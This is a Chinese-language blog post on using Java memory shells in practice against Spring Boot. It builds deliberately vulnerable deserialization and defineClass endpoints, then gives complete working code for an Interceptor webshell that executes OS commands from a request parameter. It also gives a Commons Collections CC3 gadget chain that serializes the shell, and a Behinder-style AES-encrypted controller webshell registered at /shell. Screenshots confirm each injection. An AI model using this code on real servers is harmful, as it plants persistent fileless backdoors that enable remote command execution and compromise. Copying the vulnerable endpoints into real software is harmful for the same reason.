# 实战中内存马利用

  
  
&lt;!--more--&gt;  
## 0x00 前言  
前面学习了内存马的基础操作，现在来学习一下利用。  
## 0x01 内存马结合反序列化相关利用  
这里直接用SpringBoot  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    
    &lt;version&gt;3.2.1&lt;/version&gt;    
&lt;/dependency&gt;  
```  
漏洞点  
```java  
@RestController  
public class VulController {  
    @RequestMapping(&#34;/vuln&#34;)  
    @ResponseBody  
    public String vul(HttpServletRequest request, HttpServletResponse response, String payload) throws IOException, ClassNotFoundException {  
        if (payload != null) {  
            System.out.println(payload);  
            byte[] decode = Base64.getDecoder().decode(payload);  
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);  
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
            objectInputStream.readObject();  
            return &#34;attack success&#34;;  
        }  
        return &#34;payload null&#34;;  
    }  
}  
```  
### Interceptor内存马  
这里以`Interceptor`内存马为例  
`Interceptor`内存马  
```java  
import org.springframework.web.context.WebApplicationContext;    
import org.springframework.web.context.request.RequestContextHolder;    
import org.springframework.web.servlet.HandlerInterceptor;    
import org.springframework.web.servlet.ModelAndView;    
import org.springframework.web.servlet.handler.AbstractHandlerMapping;    
    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
import java.io.BufferedReader;    
import java.io.InputStreamReader;    
import java.lang.reflect.Field;    
    
public class EvilInterceptor implements HandlerInterceptor {    
    static {    
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;, 0);    
        AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);    
        Field field = null;    
        try {    
            field = AbstractHandlerMapping.class.getDeclaredField(&#34;adaptedInterceptors&#34;);    
        } catch (NoSuchFieldException e) {    
            e.printStackTrace();    
        }    
        field.setAccessible(true);    
        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = null;    
        try {    
            adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);    
        } catch (IllegalAccessException e) {    
            e.printStackTrace();    
        }    
        EvilInterceptor evilInterceptor = new EvilInterceptor();    
        adaptedInterceptors.add(evilInterceptor);    
    }    
    
    @Override    
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {    
        String cmd = request.getParameter(&#34;cmd&#34;);    
        if (cmd != null) {    
            try {    
                java.io.PrintWriter printWriter = response.getWriter();    
                ProcessBuilder builder;    
                if (System.getProperty(&#34;os.name&#34;).toLowerCase().contains(&#34;win&#34;)) {    
                    builder = new ProcessBuilder(new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, cmd});    
                } else {    
                    builder = new ProcessBuilder(new String[]{&#34;/bin/bash&#34;, &#34;-c&#34;, cmd});    
                }    
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));    
                String s = bufferedReader.readLine();    
                printWriter.println(s);    
                printWriter.flush();    
                printWriter.close();    
            } catch (Exception e) {    
                e.printStackTrace();    
            }    
            return false;    
        }    
        return true;    
    }    
    
    @Override    
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {    
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);    
    }    
    
    @Override    
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {    
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);    
    }    
}     
```  
利用CC3的链子打  
```java  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.*;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC3 {  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class templateClass = templates.getClass();  
        Field nameFiled = templateClass.getDeclaredField(&#34;_name&#34;);  
        nameFiled.setAccessible(true);  
        nameFiled.set(templates, &#34;huahua&#34;);  
  
        Field bytecodesFiled = templateClass.getDeclaredField(&#34;_bytecodes&#34;);  
        bytecodesFiled.setAccessible(true);  
  
        byte[] code = Files.readAllBytes(Paths.get(&#34;/绝对路径/InterMemShell.class&#34;));  
        byte[][] codes = {code};  
        bytecodesFiled.set(templates, codes);  
  
        Field _tfField = templateClass.getDeclaredField(&#34;_tfactory&#34;);  
        _tfField.setAccessible(true);  
        _tfField.set(templates, new TransformerFactoryImpl());  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
                new InvokerTransformer(&#34;newTransformer&#34;, null, null)};  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap map = new HashMap&lt;&gt;();  
        Map Lazymap = LazyMap.decorate(map, chainedTransformer);  
  
        Class&lt;?&gt; annotationInvocationHandler = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);  
        Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);  
        constructor.setAccessible(true);  
        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, Lazymap);  
  
        //一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。  
        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),// 传入ClassLoader  
                new Class[]{Map.class},// 传入要实现的接口  
                h);// 传入处理调用方法的InvocationHandler  
        Object o = constructor.newInstance(Override.class, maproxy);  
        serialize(o);  
        //unserialize(&#34;ser.bin&#34;);  
    }  
  
    public static void  serialize(Object obj) throws IOException {  
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}  
```  
base64编码后发送`payload`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502071604224.png)
即可注入成功。  
### Controller内存马  
冰蝎内存马  
```java  
import org.springframework.web.context.request.RequestContextHolder;  
import org.springframework.web.context.request.ServletRequestAttributes;  
  
import javax.crypto.Cipher;  
import javax.crypto.spec.SecretKeySpec;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import javax.servlet.http.HttpSession;  
import java.lang.reflect.Method;  
import java.util.HashMap;  
  
public class magicController {  
    public void shell() throws Exception {  
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();  
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();  
        HttpSession session = request.getSession();  
        //create pageContext  
        HashMap pageContext = new HashMap();  
        pageContext.put(&#34;request&#34;,request);  
        pageContext.put(&#34;response&#34;,response);  
        pageContext.put(&#34;session&#34;,session);  
        try {  
            if (request.getMethod().equals(&#34;POST&#34;)) {  
                String k=&#34;e45e329feb5d925b&#34;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/  
                session.putValue(&#34;u&#34;,k);  
                Cipher c=Cipher.getInstance(&#34;AES&#34;);  
                c.init(2,new SecretKeySpec(k.getBytes(),&#34;AES&#34;));  
                Method method = Class.forName(&#34;java.lang.ClassLoader&#34;).getDeclaredMethod(&#34;defineClass&#34;, byte[].class, int.class, int.class);  
                method.setAccessible(true);  
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));  
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);  
                evilclass.newInstance().equals(pageContext);  
            }  
        } catch (Exception e){  
            e.printStackTrace();  
        }  
    }  
}  
```  
注册控制器  
```java  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
import org.springframework.web.context.WebApplicationContext;  
import org.springframework.web.context.request.RequestContextHolder;  
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;  
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;  
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  
import java.lang.reflect.Method;  
  
public class ConMemShell extends AbstractTranslet {  
    static {  
        try {  
            String className = &#34;magicController&#34;;  
            //加载magicController类的字节码  
            String b64 = &#34;b64&#34;;  
            byte[] d = new sun.misc.BASE64Decoder().decodeBuffer(b64);  
            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;, new Class[]{String.class, byte[].class, int.class, int.class});  
            m.setAccessible(true);  
            m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{className, d, 0, d.length});  
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;, 0);  
            PatternsRequestCondition url = new PatternsRequestCondition(&#34;/shell&#34;);  
            RequestMappingInfo info = new RequestMappingInfo(url, null, null, null, null, null, null);  
            RequestMappingHandlerMapping rs = context.getBean(RequestMappingHandlerMapping.class);  
            Method mm = Class.forName(className).getMethod(&#34;shell&#34;);  
            rs.registerMapping(info, Class.forName(className).newInstance(), mm);  
        }catch (Exception e){  
            e.printStackTrace();  
        }  
  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
  
}  
```  
生成反序列化发送即可注入成功  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502071623492.png)
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502071622564.png)
## 0x02 代码执行结合内存马  
通过上面反序列化可以看出，Java中想要执行内存马需要找一个能够加载字节码的函数，在Java中正好存在`defineClass`能够加载字节码  
```java  
@RequestMapping(&#34;/rce&#34;)    
@ResponseBody    
public String rce(HttpServletRequest request, HttpServletResponse response,String payload) throws Exception {    
    if(payload != null){    
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();    
        Method defineClass = ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;,String.class,byte[].class,int.class,int.class);    
        defineClass.setAccessible(true);    
        byte[] code = Base64.getDecoder().decode(payload);    
        Class Evil = (Class)defineClass.invoke(classLoader,&#34;EvilInterceptor&#34;,code,0,code.length);    
        Evil.newInstance();    
        return &#34;Inject success&#34;;    
    }else{    
    
        return &#34;Inject failed&#34;;    
    }    
}  
```  
直接注入上面的Interceptor class文件即可  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502130122733.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502130121150.png)
  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%A9%E7%94%A8/  

